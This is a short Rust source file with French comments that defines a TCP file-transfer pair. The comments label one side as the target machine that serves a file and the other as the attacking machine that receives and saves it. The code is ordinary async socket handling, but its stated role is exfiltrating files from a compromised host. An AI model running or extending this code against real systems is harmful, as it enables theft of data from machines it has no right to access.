use std::error::Error;
use tokio::net::{TcpListener, TcpStream};
use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
use log::{info, error};
use std::fs;

/// Côté "serveur" (machine cible) : écoute un port, et quand un client se connecte,
/// envoie le contenu du `src_path` via TCP.
pub async fn remote_download_server(listen_addr: &str, src_path: &str) -> Result<(), Box<dyn Error>> {
    info!("[remote_download_server] Listening on {}, serving file {}", listen_addr, src_path);

    let listener = TcpListener::bind(listen_addr).await?;
    // On suppose qu'un seul client se connecte
    let (mut socket, addr) = listener.accept().await?;
    info!("Client connected: {}", addr);

    // Lire le fichier
    let data = fs::read(src_path)?;

    // Envoyer la taille en premier (u64)
    socket.write_u64(data.len() as u64).await?;

    // Envoyer le contenu
    socket.write_all(&data).await?;
    info!("File sent successfully ({} bytes).", data.len());

    Ok(())
}

/// Côté "client" (machine attaquante) : se connecte au serveur remote_download,
/// reçoit le fichier et l'enregistre en local dans `dst_path`.
pub async fn remote_download_client(server_addr: &str, dst_path: &str) -> Result<(), Box<dyn Error>> {
    info!("[remote_download_client] Connecting to {}", server_addr);

    let mut stream = TcpStream::connect(server_addr).await?;
    info!("Connected to server.");

    // Lire la taille (u64)
    let size = stream.read_u64().await?;
    info!("Server says file size is {} bytes", size);

    // Lire le contenu
    let mut buffer = vec![0u8; size as usize];
    stream.read_exact(&mut buffer).await?;

    // Ecrire dans le fichier local
    fs::write(dst_path, &buffer)?;

    info!("File received and saved to {}", dst_path);
    Ok(())
}
